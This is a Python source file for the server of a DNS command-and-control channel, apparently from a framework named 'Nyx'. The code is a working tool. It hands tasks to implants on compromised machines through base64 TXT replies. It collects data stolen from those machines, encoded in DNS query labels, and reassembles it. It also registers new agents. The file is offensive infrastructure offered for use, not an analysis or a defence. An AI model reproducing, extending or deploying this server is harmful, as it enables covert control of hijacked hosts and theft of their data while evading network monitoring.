"""
DNS C2 Server — handles agent DNS beacon traffic.

Protocol (agent → server):
  TXT query:  <agentid>.poll.<domain>  → server responds with base64(JSON task)
  Data exfil: <chunk>.<seq>.<taskid>.<agentid>.r.<domain>  → captured from query labels

The server binds UDP/TCP port 53 using dnslib. Operators set the authoritative
NS record for a subdomain to point at the C2 server.
"""

import base64
import json
import threading
import time
from typing import Optional

try:
    import dnslib
    import dnslib.server
    HAS_DNSLIB = True
except ImportError:
    HAS_DNSLIB = False

# Pending task queue: agent_id → Task dict
_pending_tasks: dict[str, dict] = {}
_pending_lock = threading.Lock()

# Received exfil chunks: (taskid, agentid) → {seq: chunk}
_exfil_chunks: dict[tuple, dict] = {}
_exfil_lock = threading.Lock()

# Completed exfil results: taskid → decoded payload
_exfil_results: dict[str, dict] = {}

_dns_server: Optional["dnslib.server.DNSServer"] = None
_c2_domain: str = ""


class NyxDNSResolver:
    """dnslib resolver that handles Nyx C2 queries."""

    def __init__(self, domain: str):
        self.domain = domain.lower().strip(".")

    def resolve(self, request, handler):
        if not HAS_DNSLIB:
            return

        reply = request.reply()
        qname = str(request.q.qname).lower().strip(".")

        # Strip the c2 domain suffix
        if not qname.endswith("." + self.domain) and qname != self.domain:
            reply.header.rcode = dnslib.RCODE.NXDOMAIN
            return reply

        prefix = qname[: len(qname) - len(self.domain) - 1]
        labels = prefix.split(".")

        # ── Poll query: <agentid>.poll ────────────────────────────────────────
        if len(labels) == 2 and labels[1] == "poll":
            agent_id = labels[0]
            task = _pop_pending_task(agent_id)

            if agent_id == "register":
                # New agent — generate an ID and return it as a task
                new_id = _register_dns_agent()
                task_obj = {"id": "register", "command": new_id}
            elif task:
                task_obj = task
            else:
                task_obj = {"id": "noop", "command": "noop"}

            encoded = base64.b64encode(json.dumps(task_obj).encode()).decode()
            # Split into 255-char TXT strings
            chunks = [encoded[i: i + 255] for i in range(0, len(encoded), 255)]
            rr = dnslib.RR(
                rname=request.q.qname,
                rtype=dnslib.QTYPE.TXT,
                rdata=dnslib.TXT([c.encode() for c in chunks]),
                ttl=0,
            )
            reply.add_answer(rr)
            return reply

        # ── Data exfil: <chunk>.<seq>.<taskid>.<agentid>.r ───────────────────
        if len(labels) >= 5 and labels[-1] == "r":
            chunk    = labels[0]
            seq_str  = labels[1]
            task_id  = labels[2]
            agent_id = labels[3]
            # "done" marker
            if chunk == "done":
                _assemble_exfil(task_id, agent_id)
            else:
                try:
                    seq = int(seq_str)
                    with _exfil_lock:
                        key = (task_id, agent_id)
                        if key not in _exfil_chunks:
                            _exfil_chunks[key] = {}
                        _exfil_chunks[key][seq] = chunk
                except ValueError:
                    pass

            # Respond with a benign A record (acknowledgment)
            reply.add_answer(
                dnslib.RR(
                    rname=request.q.qname,
                    rtype=dnslib.QTYPE.A,
                    rdata=dnslib.A("127.0.0.1"),
                    ttl=0,
                )
            )
            return reply

        reply.header.rcode = dnslib.RCODE.NXDOMAIN
        return reply


def _pop_pending_task(agent_id: str) -> Optional[dict]:
    with _pending_lock:
        return _pending_tasks.pop(agent_id, None)


_dns_agents: list[str] = []
_dns_agents_lock = threading.Lock()


def _register_dns_agent() -> str:
    import secrets
    new_id = secrets.token_hex(8)
    with _dns_agents_lock:
        _dns_agents.append(new_id)
    return new_id


def _assemble_exfil(task_id: str, agent_id: str):
    key = (task_id, agent_id)
    with _exfil_lock:
        chunks = _exfil_chunks.pop(key, {})
    if not chunks:
        return
    # Sort by sequence number and join
    ordered = "".join(chunks[k] for k in sorted(chunks.keys()))
    try:
        data = base64.b64decode(ordered + "==")
        payload = json.loads(data)
        _exfil_results[task_id] = payload
    except Exception:
        pass


# ── Public API ────────────────────────────────────────────────────────────────

def start_dns_server(domain: str, port: int = 53) -> str:
    global _dns_server, _c2_domain

    if not HAS_DNSLIB:
        return "dnslib not installed — run: pip install dnslib"

    if _dns_server:
        return f"DNS server already running on port {port}"

    _c2_domain = domain
    resolver = NyxDNSResolver(domain)

    try:
        _dns_server = dnslib.server.DNSServer(
            resolver=resolver,
            port=port,
            address="0.0.0.0",
            tcp=True,
        )
        _dns_server.start_thread()
        return f"DNS C2 server started on 0.0.0.0:{port} for domain {domain}"
    except PermissionError:
        return f"Permission denied on port {port} — run as root or use port > 1024"
    except Exception as e:
        return f"DNS server error: {e}"


def stop_dns_server() -> str:
    global _dns_server
    if not _dns_server:
        return "DNS server not running"
    _dns_server.stop()
    _dns_server = None
    return "DNS server stopped"


def queue_task_for_agent(agent_id: str, task: dict):
    """Queue a task to be delivered to an agent via DNS polling."""
    with _pending_lock:
        _pending_tasks[agent_id] = task


def get_exfil_result(task_id: str) -> Optional[dict]:
    return _exfil_results.get(task_id)


def list_dns_agents() -> list[str]:
    with _dns_agents_lock:
        return list(_dns_agents)
